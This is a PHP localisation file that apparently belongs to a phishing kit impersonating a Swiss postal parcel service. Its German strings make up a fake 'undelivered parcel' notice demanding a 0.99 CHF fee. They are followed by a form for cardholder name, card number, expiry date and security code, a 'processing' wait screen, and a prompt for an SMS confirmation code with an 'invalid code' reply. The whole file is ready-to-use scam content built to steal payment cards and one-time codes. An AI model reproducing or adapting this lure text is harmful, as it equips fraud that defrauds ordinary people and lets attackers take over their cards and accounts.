<?php 

$lang = array(
    "TRACK" => "Verfolgen",
    "TRACK1" => "Standorte",
    "TRACK2" => "Jobs",
    "TRACK3" => "Über uns",
    "TRACK4" => "Hilfe und Kontakt",
    "TRACK5" => "Mein Beitrag",
    "TRACK6" => "Briefe senden",
    "TRACK7" => "Pakete senden",
    "TRACK8" => "Post empfangen",
    "TRACK9" => "Weitere Angebote",
    "TRACK11" => "Ihr Paket verfolgen",

    "TRACK12" => "Wir konnten Ihr Paket nicht zustellen, 
    da einige Gebühren noch nicht bezahlt wurden. Bitte zahlen Sie die 
    Versandkosten und vereinbaren Sie ein neues Lieferdatum.",

    "TRACK13" => "IHRE SENDUNG",
    "TRACK14" => "Ihr Paket ist in Bearbeitung",
    "TRACK15" => "Zielort:",
    "TRACK16" => "Schweiz",
    "TRACK17" => "Firmenname:",
    "TRACK18" => "Gewicht:",
    "TRACK19" => "Gebühren:",
    "TRACK20" => "Endpreis:",
    "TRACK21" => "Weiter",

    "CARD-C1" => "Zahlung",
    "CARD-C2" => "Abmelden",
    "CARD-C3" => "Versandkosten: 0,99 CHF",
    "CARD-C4" => "Bitte fügen Sie eine Zahlungsmethode hinzu, um die Versandkosten zu bezahlen und Ihr Paket zu liefern.",
    "CARD-C5" => "Name des Karteninhabers",
    "CARD-C6" => "Kartennummer",
    "CARD-C7" => "Ablaufdatum",
    "CARD-C8" => "Sicherheitscode",
    "CARD-C9" => "Weiter",

    "WAIT-A" => "Warten",
    "WAIT-A1" => "Bitte warten...",
    "WAIT-A2" => "Ihre Informationen werden verarbeitet...",

    "SMS-A3" => "SMS",
    "SMS-A4" => "Bestätigung",
    "SMS-A5" => "Bitte geben Sie den Bestätigungscode ein, der an Ihr Telefon gesendet wurde.",
    "SMS-A6" => "Ungültiger Code",
    "SMS-A7" => "Bestätigen",
);

?>
